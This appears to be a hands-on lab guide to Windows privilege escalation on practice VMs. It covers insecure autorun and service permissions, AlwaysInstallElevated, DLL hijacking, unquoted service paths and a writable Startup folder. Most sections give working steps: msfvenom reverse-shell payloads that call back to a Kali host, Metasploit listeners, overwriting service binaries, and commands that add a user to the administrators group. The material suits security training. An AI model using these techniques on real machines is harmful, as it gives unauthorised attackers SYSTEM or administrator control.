  Windows Privilege Escalation: Insecure Autorun Permissions
  ==========================================================
  
  This guide demonstrates a privilege escalation technique by exploiting an executable in an autorun location that has insecure file permissions. The goal is to replace the legitimate program with a malicious payload, which will be executed with higher privileges when an administrator logs in.
  
  üïµÔ∏è‚Äç‚ôÇÔ∏è Detection
  ----------------
  
  First, we need to identify the vulnerable autorun program and confirm its weak permissions.
  
  1.  Scan for Autorun Programs
  
      Open a command prompt on the Windows VM and run Autoruns to inspect programs that launch on startup.
  
      
  
      ```DOS
      C:\Users\User\Desktop\Tools\Autoruns\Autoruns64.exe
  
      ```
  
  2.  Inspect Logon Items
  
      In the Autoruns window, click on the Logon tab to see all applications that run when a user logs in.
  
  3.  Identify the Target Program
  
      From the list, notice the "My Program" entry. Observe that it points to the following executable:
  
      ```
      C:\Program Files\Autorun Program\program.exe
  
      ```

      <img width="819" height="209" alt="image" src="https://github.com/user-attachments/assets/08b8581f-0b3a-4cc6-9c0a-8986e8ad13da" />


  4.  Check File Permissions
  
      Return to the command prompt and use accesschk64.exe to check the permissions on the program's directory.
  
      
  
      ```DOS
      C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\Autorun Program"
  
      ```

      <img width="647" height="263" alt="image" src="https://github.com/user-attachments/assets/d20be315-7309-4288-9cb4-ec06353ce661" />


  5.  Confirm the Vulnerability
  
      The output will show that the Everyone user group has ``FILE_ALL_ACCESS`` permission. This is the vulnerability, as it means any user can modify or replace the program.exe file.
  
  üí• Exploitation
  ---------------
  
  The exploitation process involves creating a malicious payload, setting up a listener to receive the connection, and replacing the original executable.
  
  ### 1\. Setting Up the Listener & Payload (Kali VM)
  
  First, we will use the Metasploit Framework to create a reverse shell payload and a listener to catch the connection.
  
  1.  **Start Metasploit**
  
      
  
      ```Bash
      msfconsole
  
      ```
  
  2.  Configure the Multi/Handler
  
      This module will listen for the incoming connection from our payload.
  
      
  
      ```Ruby
      msf6 > use multi/handler
      msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
      msf6 exploit(multi/handler) > set lhost <Your Kali VM IP Address>
  
      ```


  3.  Start the Listener
  
      The listener will now wait for a connection.
  
      
  
      ```Ruby
      msf6 exploit(multi/handler) > run
  
      ```

      <img width="863" height="492" alt="image" src="https://github.com/user-attachments/assets/d70396ea-063a-465c-99a1-8d1fa4efc54e" />

  
  4.  Generate the Malicious Payload
  
      Open a new terminal window on your Kali VM. Use msfvenom to create a malicious program.exe that will connect back to your listener.
  
      
  
      ```Bash
      msfvenom -p windows/meterpreter/reverse_tcp lhost=<Your Kali VM IP Address> -f exe -o program.exe
  
      ```

     <img width="929" height="337" alt="image" src="https://github.com/user-attachments/assets/d4d93941-457d-46a8-8a3f-07f1eca288fe" />

  
  5.  Transfer the Payload
  
      Copy the newly generated program.exe file from your Kali VM to the Windows VM's desktop.

      <img width="1543" height="609" alt="image" src="https://github.com/user-attachments/assets/5daebdf6-0778-4aca-8596-96e866c26c38" />


  ### 2\. Planting the Payload (Windows VM)
  
  1.  On the Windows VM, replace the original program with your malicious payload. You can do this via the command line or file explorer:
  
      
  
      ```DOS
      move C:\Users\User\Desktop\program.exe "C:\Program Files\Autorun Program\program.exe"
  
      ```
  
      *(Confirm overwrite if prompted)*
  
  2.  To trigger the exploit, you must simulate the condition under which the program runs with elevated privileges. **Log off** from the current user session and then **log back on as an administrator**.
  
  ‚úÖ Gaining Access & Verification
  -------------------------------
  
  When the administrator logs in, the malicious `program.exe` will execute and connect back to your listener on the Kali VM.
  
  1.  Catch the Session
  
      In your Metasploit terminal, you will see a new session being created.
  
      ```
      [*] Meterpreter session 1 opened (...)
  
      ```
  
  2.  Interact with the Session
  
      Enter the new session using its ID.
  
      
  
      ```Ruby
      msf6 exploit(multi/handler) > sessions -i 1
  
      ```
  
  3.  Verify Privileges
  
      To confirm that the attack was successful and you have escalated privileges, run the getuid command. The output should show that you are running as the administrator user.
  
      
  
      ```Ruby
      meterpreter > getuid
  
      ```

      <summary>AlwaysInstallElevated</summary>


  
  
  Windows Privilege Escalation: AlwaysInstallElevated
  ===================================================
  
  This guide demonstrates how to exploit the `AlwaysInstallElevated` policy in Windows to achieve privilege escalation. When this policy is enabled in both the `HKEY_LOCAL_MACHINE` (HKLM) and `HKEY_CURRENT_USER` (HKCU) registry hives, it allows any user to install MSI packages with `NT AUTHORITY\SYSTEM` privileges.
  
  üïµÔ∏è‚Äç‚ôÇÔ∏è Detection
  ----------------
  
  The first step is to query the Windows Registry to confirm that the `AlwaysInstallElevated` policy is enabled for both the system and the current user.
  
  1.  Check the Local Machine Policy (HKLM)
  
      Open a command prompt on the Windows VM and query the following registry key:
  
      
  
      ```DOS
      reg query HKLM\Software\Policies\Microsoft\Windows\Installer
  
      ```
  
      > Confirm that the `AlwaysInstallElevated` value is present and set to `0x1`.
  
  2.  Check the Current User Policy (HKCU)
  
      Next, query the key for the current user:
  
      
  
      ```DOS
      reg query HKCU\Software\Policies\Microsoft\Windows\Installer
  
      ```
  
      > Confirm that the `AlwaysInstallElevated` value is also set to `0x1`. If both keys are set to 1, the system is vulnerable.
  
  üí• Exploitation
  ---------------
  
  Now we will generate a malicious MSI package and use it to gain a privileged shell on the target machine.
  
  ### 1\. Setting Up the Listener & Payload (Kali VM)
  
  Use the Metasploit Framework on your Kali machine to create the payload and a listener to receive the connection.
  
  1.  **Start Metasploit**
  
      
  
      ```Bash
      msfconsole
  
      ```
  
  2.  Configure the Multi/Handler
  
      This module will listen for the incoming connection from our MSI payload.
  
      
  
      ```Ruby
      msf6 > use multi/handler
      msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
      msf6 exploit(multi/handler) > set lhost <Your Kali VM IP Address>
  
      ```
  
  3.  Start the Listener
  
      The listener will now wait for a connection.
  
      
  
      ```Ruby
      msf6 exploit(multi/handler) > run
  
      ```
  
  4.  Generate the Malicious MSI Payload
  
      Open a new terminal window on your Kali VM. Use msfvenom to create a malicious .msi file.
  
      
  
      ```Bash
      msfvenom -p windows/meterpreter/reverse_tcp lhost=<Your Kali VM IP Address> -f msi -o setup.msi
  
      ```
  
  5.  Transfer the Payload
  
      Copy the newly generated setup.msi file from your Kali VM to the Windows VM, placing it in a writable directory like C:\Temp.
  
  ### 2\. Executing the Payload (Windows VM)
  
  1.  On the Windows VM, open a command prompt and execute the MSI package using `msiexec`. The `/quiet` and `/qn` flags will run the installation silently in the background.
  
      
  
      ```DOS
      msiexec /quiet /qn /i C:\Temp\setup.msi
  
      ```
  
  ‚úÖ Gaining Access
  ----------------
  
  Return to your Metasploit terminal on the Kali VM. The MSI installer will execute with `SYSTEM` privileges and connect back to your listener.
  
  1.  Catch the Privileged Shell
  
      You will see a new Meterpreter session open.
  
      ```ruby
      [*] Meterpreter session 1 opened (...)
  
      ```
  
  2.  Verify Privileges
  
      Interact with the new session and run the getuid command to confirm your identity.
  
      
  
      ```Ruby
      msf6 exploit(multi/handler) > sessions -i 1
      meterpreter > getuid
      Server username: NT AUTHORITY\SYSTEM
  
      ```
  
      You have successfully escalated to the highest privilege level on the system.

  Windows Privilege Escalation: Insecure Service Registry Permissions
  ===================================================================
  
  This guide demonstrates a privilege escalation technique by exploiting a Windows service with weak permissions on its associated registry key. If a user has `FullControl` over a service's registry entry, they can modify its configuration---such as the executable it runs (`ImagePath`)---to execute arbitrary code with the service's privileges, which are often `NT AUTHORITY\SYSTEM`.
  
  üïµÔ∏è‚Äç‚ôÇÔ∏è Detection
  ----------------
  
  First, we must identify that a low-privileged user has modification rights over a service's registry key.
  
  1.  Check Registry Key Permissions
  
      Open a PowerShell prompt on the Windows VM and use Get-Acl to inspect the permissions for the target service's registry key (regsvc).
  
      
  
      ```PowerShell
      Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl
  
      ```

     <img width="994" height="270" alt="image" src="https://github.com/user-attachments/assets/5f376f33-75df-4868-a440-f9afb2c52cb2" />



  2.  Identify the Vulnerability
  
      In the output, examine the Access list. Notice that the NT AUTHORITY\INTERACTIVE group has FullControl permission. This is the vulnerability. The INTERACTIVE group includes any user who is logged on locally, meaning our low-privileged user can modify this key.
  
  üí• Exploitation
  ---------------
  
  The exploitation process involves creating a custom executable, modifying the vulnerable service to run it, and then starting the service to trigger our payload.
  
  ### 1\. Preparing the Payload (Kali VM)
  
  We will compile a simple C program that adds our user to the local administrators group.
  
  1.  Transfer the Source Code
  
      First, copy the source file windows_service.c from the Windows VM (C:\Users\User\Desktop\Tools\Source\) to your Kali VM.

      <img width="1305" height="253" alt="image" src="https://github.com/user-attachments/assets/e000b2bd-8f58-4ec3-8a64-befdd41c2085" />

     
  2.  Modify the Payload Command
  
      Open windows_service.c on Kali with a text editor. Find the line containing the system() function and change its command to the following, which will add a user named user to the local administrators group.
  
      
  
      ```C
      system("cmd.exe /k net localgroup administrators user /add");
  
      ```

      <img width="703" height="576" alt="image" src="https://github.com/user-attachments/assets/4d1f4a4e-f154-4199-8c1f-f6c9fd99019d" />


  
  3.  Cross-Compile the Executable
  
      Save the file and compile it for Windows using the mingw-w64 compiler. If you don't have it, install it first with `sudo apt update && sudo apt install gcc-mingw-w64`.
  
      
  
      ```Bash
      x86_64-w64-mingw32-gcc windows_service.c -o x.exe
  
      ```

     <img width="587" height="200" alt="image" src="https://github.com/user-attachments/assets/eca01cdf-f18e-49e8-a426-b577106694fd" />

  
  4.  Transfer the Payload Back
  
      Copy the newly compiled payload, x.exe, from your Kali VM to a writable directory on the Windows VM, such as C:\Temp.

     <img width="513" height="113" alt="image" src="https://github.com/user-attachments/assets/a54a9283-0bd5-400e-a9ec-651a72a6c76c" />


  ### 2\. Modifying and Triggering the Service (Windows VM)
  
  Now, we will reconfigure the service to point to our new executable and then start it.
  
  1.  Change the Service's Binary Path
  
      On the Windows VM, open a command prompt and run the reg add command to modify the ImagePath for the regsvc service. This tells the service to run our payload instead of its original program.
  
      
  
      ```DOS
      reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f
  
      ```

     <img width="648" height="127" alt="image" src="https://github.com/user-attachments/assets/8a2610a0-b3df-448f-bbea-8bf1eabcd0d6" />


  2.  Start the Service to Trigger the Exploit
  
      Now, start the service. Windows will execute c:\temp\x.exe with the service's LocalSystem privileges.
  
      
  
      ```DOS
      sc start regsvc
  
      ```

     <img width="659" height="166" alt="image" src="https://github.com/user-attachments/assets/f523d731-d60c-4996-8164-7b6f566e29c9" />

   
      The command in our payload will now execute, adding the `user` to the administrators group.
  
  ‚úÖ Verification
  --------------
  
  To confirm that the privilege escalation was successful, check the membership of the local administrators group.
  
  1.  Check Administrators Group
  
      In the same command prompt, type:
  
      
  
      ```DOS
      net localgroup administrators
  
      ```
  
      You will now see the `user` account listed as a member, confirming that you have successfully escalated privileges.
  
  
      **`before`**

     <img width="651" height="166" alt="image" src="https://github.com/user-attachments/assets/095264d1-ad26-478e-b106-7b2e2e013f15" />


     **`after`**

     <img width="652" height="213" alt="image" src="https://github.com/user-attachments/assets/328a56ef-cd33-412a-94d0-c49ce3b4e6fe" />

      <summary>Executable Files</summary>




  
  
  Windows Privilege Escalation: Insecure Service File Permissions
  ===============================================================
  
  This guide demonstrates a privilege escalation technique by exploiting a Windows service whose executable has weak file permissions. If a low-privileged user can overwrite the service's executable, they can replace it with a malicious payload. When the service is next started, the payload will execute with the high privileges of the service account, typically `NT AUTHORITY\SYSTEM`.
  
  üïµÔ∏è‚Äç‚ôÇÔ∏è Detection
  ----------------
  
  First, we need to identify a service executable with insecure permissions that allows a standard user to modify or replace it.
  
  1.  Check File Permissions
  
      Open a command prompt on the Windows VM and use accesschk64.exe to inspect the permissions for the target service executable (filepermservice.exe).
  
      
  
      ```DOS
      C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\File Permissions Service"
  
      ```
  
  2.  Identify the Vulnerability
  
      The output indicates that the Everyone user group has FILE_ALL_ACCESS permission on the filepermservice.exe file. This is a critical misconfiguration, as it means any user on the system can replace this executable.
  
  ‚öôÔ∏è Prerequisite: Creating the Payload
  -------------------------------------
  
  Before we can exploit this, we need to create a malicious executable (`x.exe`) that will perform our privileged action. We will use `msfvenom` on a Kali VM for this.
  
  1.  Generate the Payload
  
      On your Kali machine, run the following command to generate an executable that adds a standard user named user to the local administrators group.
  
      
  
      ```Bash
      msfvenom -p windows/exec CMD="net localgroup administrators user /add" -f exe -o x.exe
  
      ```
  
  2.  Transfer the Payload
  
      Copy the newly generated x.exe from your Kali machine to a writable directory on the Windows VM, such as C:\Temp.
  
  üí• Exploitation
  ---------------
  
  With the payload ready, we can now overwrite the original service executable and start the service to trigger our exploit.
  
  1.  Overwrite the Service Executable
  
      On the Windows VM, open a command prompt and use the copy command to replace the legitimate service executable with our malicious payload. The /y flag suppresses the overwrite confirmation prompt.
  
      
  
      ```DOS
      copy /y c:\Temp\x.exe "c:\Program Files\File Permissions Service\filepermservice.exe"
  
      ```
  
  2.  Start the Service to Trigger the Exploit
  
      Now, start the service. Windows will execute our malicious payload with LocalSystem privileges.
  
      
  
      ```DOS
      sc start filepermsvc
  
      ```
  
      The command embedded in our payload will now run, adding the `user` to the local administrators group.
  
  ‚úÖ Verification
  --------------
  
  To confirm that the privilege escalation was successful, check the membership of the local administrators group.
  
  1.  Check Administrators Group
  
      In the same command prompt, type:
  
      
  
      ```DOS
      net localgroup administrators
  
      ```
  
      You will now see the `user` account listed as a member of the group, confirming that you have successfully escalated privileges on the system.

      <summary> DLL Hijacking</summary>





  
  
  Windows Privilege Escalation: DLL Hijacking
  ===========================================
  
  This guide demonstrates a privilege escalation technique known as **DLL Hijacking**. This vulnerability occurs when a legitimate, high-privilege application attempts to load a Dynamic Link Library (DLL) from an insecure path. By placing a malicious DLL with the correct name in a user-writable directory that the application searches, an attacker can force the application to execute their code with elevated privileges.
  
  üïµÔ∏è‚Äç‚ôÇÔ∏è Detection
  ----------------
  
  We will use Process Monitor (`Procmon`) to observe a service's behavior and find a hijackable DLL path.
  
  1.  Launch Process Monitor
  
      On the Windows VM, navigate to C:\Users\User\Desktop\Tools\Process Monitor and run Procmon.exe as an administrator.
  
  2.  Set Up the First Filter (Process Name)
  
      We need to filter the events to only show activity from our target service.
  
      -   Go to `Filter > Filter...` (or press `Ctrl+L`).
  
      -   Create a rule that reads: **`Process Name` `is` `dllhijackservice.exe` `then` `Include`**.
  
      -   Click **Add**, then **Apply**.
  
  <img width="969" height="612" alt="image" src="https://github.com/user-attachments/assets/6a8e2778-9178-4a24-bdc9-4e84deb5a858" />
  
  
  
  3.  Set Up the Second Filter (Result)
  
      Next, we only want to see attempts to load files that were not successful.
  
      -   Create a second rule that reads: **`Result` `is` `NAME NOT FOUND` `then` `Include`**.
  
      -   Click **Add**, then **Apply**, and **OK**.
  
  
  <img width="842" height="466" alt="image" src="https://github.com/user-attachments/assets/05e1529a-34d6-42a2-a81c-5b7367207d7d" />
  
  
  4.  Trigger the Service
  
      Open a command prompt and start the vulnerable service to generate events in Procmon.
  
      DOS
  
      ```
      sc start dllsvc
  
      ```
  
  <img width="944" height="699" alt="image" src="https://github.com/user-attachments/assets/b15c6de7-6b51-4b83-af99-ff440e3aaf75" />
  
  
  
  5.  Analyze the Results
  
      Go back to the Process Monitor window. You will see several NAME NOT FOUND results. The key finding is an attempt to load a DLL from a user-writable directory.
  
      > The output will show that the service tried to load `hijackme.dll` from `C:\Temp`, but the operation failed because the file doesn't exist. Since `C:\Temp` is a writable location, this is our hijacking opportunity.
  
  üí• Exploitation
  ---------------
  
  Now we will create a malicious DLL, place it in the vulnerable path, and restart the service to execute our code.
  
  ### 1\. Preparing the Malicious DLL (Kali VM)
  
  1.  Transfer the Source Code
  
      Copy the source file C:\Users\User\Desktop\Tools\Source\windows_dll.c from the Windows VM to your Kali machine.
  
  <img width="1208" height="476" alt="image" src="https://github.com/user-attachments/assets/9596730f-855b-4d47-aefd-b90baea6c6b3" />
  
  
  
  2.  Modify the Payload
  
      Open windows_dll.c on Kali. Modify the system() function to execute a command that adds your user (user) to the local administrators group.
  
      C
  
      ```
      system("cmd.exe /k net localgroup administrators user /add");
  
      ```
  
  <img width="767" height="368" alt="image" src="https://github.com/user-attachments/assets/7a3372cf-2628-4177-bff2-a83f724591dc" />
  
      
  
  3.  Compile the Malicious DLL
  
      Save the file and use the mingw-w64 cross-compiler to create the DLL. The -shared flag is essential for compiling a DLL file.
  
      Bash
  
      ```
      x86_64-w64-mingw32-gcc windows_dll.c -shared -o hijackme.dll
  
      ```
  
  <img width="686" height="228" alt="image" src="https://github.com/user-attachments/assets/e584f743-26c1-427f-9cbe-6cc0b30eb722" />
  
      
  
  4.  Transfer the DLL Back
  
      Copy the compiled hijackme.dll from your Kali VM to the C:\Temp directory on the Windows VM.
  
  <img width="950" height="218" alt="image" src="https://github.com/user-attachments/assets/1547550e-54a2-4f32-8e8c-25010fd84fdd" />
  
  
  ### 2\. Planting and Triggering the DLL (Windows VM)
  
  1.  With `hijackme.dll` now in `C:\Temp`, the service will find and load it upon startup. Open a command prompt and restart the service to trigger the exploit.
  
      DOS
  
      ```
      sc stop dllsvc & sc start dllsvc
  
      ```
  
  <img width="653" height="456" alt="image" src="https://github.com/user-attachments/assets/535a519a-942b-4897-8ef2-428f8600f7d9" />
  
  
      When the service starts, it will load our malicious DLL and execute the embedded command with `SYSTEM` privileges.
  
  ‚úÖ Verification
  --------------
  
  To confirm the attack was successful, check the membership of the local administrators group.
  
  1.  Check Administrators Group
  
      In the command prompt, run:
  
      DOS
  
      ```
      net localgroup administrators
  
      ```
  
      You should now see the `user` account listed as a member of the administrators group, confirming a successful privilege escalation.

  Windows Privilege Escalation: Insecure Service Permissions (binPath)
  ====================================================================
  
  This guide demonstrates a privilege escalation technique by exploiting a Windows service where a low-privileged user has permissions to modify its configuration. If a user has the `SERVICE_CHANGE_CONFIG` permission, they can alter the service's binary path (`binPath`) to execute an arbitrary command with the privileges of the service account, which is often `NT AUTHORITY\SYSTEM`.
  
  üïµÔ∏è‚Äç‚ôÇÔ∏è Detection
  ----------------
  
  First, we need to identify a service that our user has permission to reconfigure.
  
  1.  Check Service Permissions
  
      Open a command prompt on the Windows VM and use accesschk64.exe to inspect the permissions for the target service (daclsvc).
  
      
  
      ```ruby
      C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wuvc daclsvc
  
      ```
  
  2.  Identify the Vulnerability
  
      The output will show a list of permissions. The key finding is that your current user (e.g., User-PC\User) has the SERVICE_CHANGE_CONFIG permission. This allows us to modify critical service parameters, including the path to its executable.
  
  üí• Exploitation
  ---------------
  
  Now we will reconfigure the service to execute a command of our choice instead of its intended program and then start it to trigger the exploit.
  
  1.  Modify the Service's Binary Path (binPath)
  
      In the command prompt, use the sc config command to change the binpath of the daclsvc service. We will set it to a command that adds our current user (user) to the local administrators group.
  
      
  
      ```ruby
      sc config daclsvc binpath= "net localgroup administrators user /add"
  
      ```
  
      > **Note:** The space after `binpath=` is required. Windows will execute whatever is in the `binpath` string when the service starts.
  
  2.  Start the Service to Trigger the Exploit
  
      Now, start the service. The Service Control Manager will attempt to run the "binary" we specified, executing our command with LocalSystem privileges.
  
      
  
      ```ruby
      sc start daclsvc
  
      ```
  
      You may see an error message stating the service did not respond in a timely fashion. This is expected, as our command runs and exits immediately, which is not the behavior of a normal service. The command will have already succeeded.
  
  ‚úÖ Verification
  --------------
  
  To confirm that the privilege escalation was successful, check the membership of the local administrators group.
  
  1.  Check Administrators Group
  
      In the same command prompt, type:
  
      
  
      ```RUBY
      net localgroup administrators
  
      ```
  
      You will now see the `user` account listed as a member of the group, confirming a successful privilege escalation.

      <summary>Unquoted Service Paths</summary>



  
  
  
  Windows Privilege Escalation: Unquoted Service Paths
  ====================================================
  
  This guide demonstrates a privilege escalation technique by exploiting an **Unquoted Service Path**. This common misconfiguration occurs when the path to a service's executable is not enclosed in quotation marks and contains spaces.
  
  When this happens, Windows attempts to find the executable by treating each space as a delimiter. For a path like `C:\Program Files\Vulnerable Service\service.exe`, Windows will try to execute the following in order:
  
  1.  `C:\Program.exe`
  
  2.  `C:\Program Files\Vulnerable.exe`
  
  3.  `C:\Program Files\Vulnerable Service\service.exe`
  
  If an attacker can place a malicious executable in a writable directory higher up in this search order (e.g., creating `C:\Program Files\Vulnerable.exe`), they can trick the system into running their code with the service's high-level privileges.
  
  üïµÔ∏è‚Äç‚ôÇÔ∏è Detection
  ----------------
  
  First, we need to find a service with an unquoted path and confirm we have write permissions in one of the parent directories.
  
  1.  Query the Service Configuration
  
      Open a command prompt on the Windows VM and use sc qc (Query Configuration) to inspect the unquotedsvc service.
  
      
  
      ```ruby
      sc qc unquotedsvc
  
      ```
  
  2.  Identify the Unquoted Path
  
      In the output, look at the BINARY_PATH_NAME.
  
      > Notice that the path is not enclosed in quotes and contains spaces, for example: `C:\Program Files\Unquoted Path Service\unquotedpathservice.exe`. This confirms the vulnerability.
  
  3.  Check Directory Permissions
  
      Now, check if you have permission to write a file into one of the directories in the path. We will check C:\Program Files\Unquoted Path Service.
  
      
  
      ```ruby
      icacls "C:\Program Files\Unquoted Path Service"
  
      ```
  
      If the output shows that your user or a group you belong to (like `BUILTIN\Users`) has write permissions (`(W)`, `(M)`, or `(F)`), you can proceed with the exploit.
  
  üí• Exploitation
  ---------------
  
  The exploitation involves creating a malicious service executable, placing it in the vulnerable directory, and starting the service.
  
  ### 1\. Preparing the Payload (Kali VM)
  
  1.  Generate the Malicious Executable
  
      On your Kali machine, use msfvenom to create a payload. The output filename must match the part of the service path you are targeting. For C:\Program Files\Unquoted Path Service\unquotedpathservice.exe, the vulnerable file is common.exe placed inside the parent folder. We will use the -f exe-service format, which is suitable for Windows services.
  
      Bash
  
      ```ruby
      msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe
  
      ```
  
  2.  Transfer the Payload
  
      Copy the newly generated common.exe file from your Kali VM to the Windows VM.
  
  ### 2\. Planting and Triggering the Exploit (Windows VM)
  
  1.  Place the Payload in the Vulnerable Path
  
      On the Windows VM, move your common.exe payload into the writable directory identified during detection.
  
      
  
      ```ruby
      move C:\Path\to\common.exe "C:\Program Files\Unquoted Path Service\"
  
      ```
  
  2.  Start the Service to Trigger the Exploit
  
      Now, start the service. When the Service Control Manager tries to launch the service, Windows will find and execute your malicious common.exe before it looks for the legitimate unquotedpathservice.exe.
  
      
  
      ```ruby
      sc start unquotedsvc
  
      ```
  
      The service may fail to start correctly, but our embedded command will have already executed with `SYSTEM` privileges.
  
  ‚úÖ Verification
  --------------
  
  To confirm that the privilege escalation was successful, check the membership of the local administrators group.
  
  1.  Check Administrators Group
  
      In the command prompt, type:
  
      
  
      ```ruby
      net localgroup administrators
  
      ```
  
      You will now see the `user` account listed as a member of the group, confirming a successful privilege escalation.

  <summary>Privilege Escalation - Startup Applications</summary>



Windows Persistence & PrivEsc: Writable Startup Folder
======================================================

This guide demonstrates a persistence and potential privilege escalation technique by exploiting a globally writable "All Users" Startup folder. If a low-privileged user can place an executable in this folder, that program will automatically run whenever *any* user---including an administrator---logs into the system. This can be used to gain a shell with the privileges of the user who logs in next.

üïµÔ∏è‚Äç‚ôÇÔ∏è Detection
----------------

First, we need to check the permissions of the `All Users` Startup folder to see if it's writable by our current user.

1.  Check Folder Permissions

    Open a command prompt on the Windows VM and use icacls.exe to inspect the permissions for the Startup folder.

    

    ```DOS
    icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"

    ```

2.  Identify the Vulnerability

    In the output, look for the permissions granted to the BUILTIN\Users group. If it shows (F) for Full Access or (M) for Modify access, the folder is writable, and the system is vulnerable to this technique.

üí• Exploitation
---------------

The exploitation process involves creating a reverse shell payload, placing it in the vulnerable Startup folder, and waiting for a privileged user to log in.

### 1\. Setting Up the Listener & Payload (Kali VM)

Use the Metasploit Framework on your Kali machine to create the payload and a listener to receive the connection.

1.  **Start Metasploit**

    

    ```Bash
    msfconsole

    ```

2.  Configure the Multi/Handler

    This module will listen for the incoming connection from our payload.

    

    ```Ruby
    msf6 > use multi/handler
    msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
    msf6 exploit(multi/handler) > set lhost <Your Kali VM IP Address>

    ```

3.  Start the Listener

    The listener will now wait for a connection.

    

    ```Ruby
    msf6 exploit(multi/handler) > run

    ```

4.  Generate the Malicious Payload

    Open a new terminal window on your Kali VM. Use msfvenom to create a malicious .exe file.

    

    ```Bash
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your Kali VM IP Address> -f exe -o x.exe

    ```

5.  Transfer the Payload

    Copy the newly generated x.exe file from your Kali VM to a temporary location on the Windows VM (e.g., the Desktop).

### 2\. Planting the Payload (Windows VM)

1.  On the Windows VM, move your payload into the vulnerable Startup folder.

    

    ```DOS
    move C:\Users\User\Desktop\x.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\"

    ```

2.  To trigger the exploit, **log off** from the current user.

3.  Now, **log in with an administrator account**. When the administrator's desktop loads, the `x.exe` file in the Startup folder will be automatically executed.

‚úÖ Gaining Access & Verification
-------------------------------

Return to your Metasploit terminal on the Kali VM. The payload will connect back to your listener.

1.  Catch the Session

    You will see a new Meterpreter session open. This session is running with the privileges of the administrator who just logged in.

    ```
    [*] Meterpreter session 1 opened (...)

    ```

2.  Verify Privileges

    Interact with the new session and run the getuid command to confirm the user context.

    

    ```Ruby
    meterpreter > getuid
    Server username: User-PC\Admin

    ```

    The output confirms the payload is running as the `Admin` user, successfully capturing a privileged session.
